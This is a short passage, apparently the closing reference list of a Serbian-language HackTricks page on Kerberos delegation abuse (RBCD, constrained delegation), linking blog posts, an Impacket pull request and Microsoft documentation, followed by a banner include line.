- [17] [James Forshaw - Eksploatacija RBCD-a pomoću običnog korisničkog naloga](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - Zloupotreba Constrained Delegation bez Protocol Transition-a nad nalozima bez SPN-a](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - Zloupotreba Constrained Delegation bez Protocol Transition-a nad nalozima bez SPN-a](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - S4U2Proxy sa U2U](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU - Korišćenje ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn - Omogućavanje Kerberos event logging-a](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
